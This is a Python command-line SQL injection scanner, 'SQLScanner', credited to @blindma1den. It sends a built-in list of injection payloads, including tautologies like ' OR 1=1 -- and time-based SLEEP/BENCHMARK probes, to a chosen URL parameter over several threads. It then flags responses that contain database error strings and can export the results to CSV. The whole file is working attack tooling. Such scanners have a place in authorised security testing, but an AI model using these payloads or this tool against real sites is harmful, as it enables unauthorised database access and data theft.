#!/usr/bin/env python3

import requests
import argparse
import csv
import concurrent.futures
import logging

# Default payloads
default_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1' /*",
    "' OR 'a'='a",
    "' OR 'a'='a' --",
    "' OR 'a'='a' #",
    "' OR 'a'='a' /*",
    "' OR 1=1",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 1=1 /*",
    "' OR '1'='1' AND SLEEP(5) --",
    "' OR '1'='1' AND BENCHMARK(1000000,MD5(1)) --",
]

# SQL errors for different databases
db_errors = {
    'MySQL': [
        "You have an error in your SQL syntax;",
        "Warning: mysql_fetch_assoc()",
        "Warning: mysql_num_rows()",
        "Warning: mysql_fetch_array()",
        "Unclosed quotation mark after the character string",
        "Microsoft OLE DB Provider for SQL Server",
        "mysql_num_rows() expects parameter 1 to be resource",
        "supplied argument is not a valid MySQL",
        "ORA-01756",
        "Error: unknown column",
        "Query failed",
        "SQLSTATE",
        "Warning: pg_exec",
        "pg_query(): Query failed",
        "unterminated quoted string",
    ],
    'PostgreSQL': [
        "ERROR: syntax error at or near",
        "pg_query(): Query failed",
    ],
    'MSSQL': [
        "SQL Server does not exist or access denied",
        "OLE DB provider for linked server",
    ],
    # Add more databases as needed
}

def is_vulnerable(response, db_type='MySQL'):
    """Analyze the response to determine if there is a possible SQL injection."""
    for error in db_errors.get(db_type, []):
        if error.lower() in response.text.lower():
            return True
    return False

def make_request(url, param, payload, method='GET', cookies=None):
    """Make a request to the URL with the given payload."""
    session = requests.Session()
    if cookies:
        session.cookies.update(cookies)

    try:
        if method == 'POST':
            return session.post(url, data={param: payload})
        elif method == 'PUT':
            return session.put(url, data={param: payload})
        elif method == 'DELETE':
            return session.delete(url, data={param: payload})
        else:
            return session.get(url, params={param: payload})
    except requests.exceptions.RequestException as e:
        logging.error(f"Error with request to {url}: {e}")
        return None

def test_sql_injection(url, param, payloads, method='GET', cookies=None):
    """Test for SQL Injection vulnerabilities."""
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_payload = {executor.submit(make_request, url, param, payload, method, cookies): payload for payload in payloads}
        for future in concurrent.futures.as_completed(future_to_payload):
            payload = future_to_payload[future]
            try:
                response = future.result()
                if response and response.status_code == 200:
                    if is_vulnerable(response):
                        results.append((payload, "Vulnerable"))
                        print(f"Possible SQL Injection vulnerability detected with payload: {payload}")
                    else:
                        results.append((payload, "Not Vulnerable"))
                else:
                    results.append((payload, "Request Failed"))
            except Exception as exc:
                logging.error(f'Payload {payload} generated an exception: {exc}')
                results.append((payload, f"Exception: {exc}"))
    return results

def export_results(results, filename='results.csv'):
    """Export results to a CSV file."""
    with open(filename, 'w', newline='') as csvfile:
        fieldnames = ['Payload', 'Vulnerability']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        for result in results:
            writer.writerow({'Payload': result[0], 'Vulnerability': result[1]})

def main():
    # Set up logging for debugging and progress
    logging.basicConfig(level=logging.INFO)

    # Custom startup message
    print("██████╗░██╗░░░░░██╗███╗░░██╗██████╗░███╗░░░███╗░█████╗░░░███╗░░██████╗░███████╗███╗░░██╗")
    print("██╔══██╗██║░░░░░██║████╗░██║██╔══██╗████╗░████║██╔══██╗░████║░░██╔══██╗██╔════╝████╗░██║")
    print("██████╦╝██║░░░░░██║██╔██╗██║██║░░██║██╔████╔██║███████║██╔██║░░██║░░██║█████╗░░██╔██╗██║")
    print("██╔══██╗██║░░░░░██║██║╚████║██║░░██║██║╚██╔╝██║██╔══██║╚═╝██║░░██║░░██║██╔══╝░░██║╚████║")
    print("██████╦╝███████╗██║██║░╚███║██████╔╝██║░╚═╝░██║██║░░██║███████╗██████╔╝███████╗██║░╚███║")
    print("╚═════╝░╚══════╝╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚══════╝╚═════╝░╚══════╝╚═╝░░╚══╝")
    print("SQLScanner")
    print("Author: @blindma1den.\n")

    parser = argparse.ArgumentParser(description="SQL Injection vulnerability detector")
    parser.add_argument("url", help="Target URL (e.g., http://example.com/search.php)")
    parser.add_argument("param", help="Parameter to test for SQL Injection")
    parser.add_argument("--method", choices=['GET', 'POST', 'PUT', 'DELETE'], default='GET', help="HTTP method to use")
    parser.add_argument("--cookies", help="Cookies to include in the requests (format: key=value,key=value)")
    parser.add_argument("--custom-payloads", help="File with custom payloads", type=argparse.FileType('r'))
    parser.add_argument("--save-payload", help="Save custom payload to file", type=str)
    parser.add_argument("--export-results", help="Export results to a CSV file", type=str)

    args = parser.parse_args()
    url = args.url
    param = args.param
    method = args.method

    # Convert cookies string to dictionary
    cookies = None
    if args.cookies:
        cookies = dict(cookie.split('=') for cookie in args.cookies.split(','))

    # Load payloads
    payloads = default_payloads
    if args.custom_payloads:
        payloads = [line.strip() for line in args.custom_payloads]

    print(f"Testing {url} for SQL Injection vulnerabilities on parameter '{param}' with method '{method}'...")

    results = test_sql_injection(url, param, payloads, method, cookies)

    if results:
        print("SQL Injection test completed. Results:")
        for result in results:
            print(f"Payload: {result[0]} | Vulnerability: {result[1]}")
    else:
        print("No SQL Injection vulnerabilities detected.")

    # Export results if needed
    if args.export_results:
        export_results(results, args.export_results)
        print(f"Results exported to {args.export_results}.")

if __name__ == "__main__":
    main()
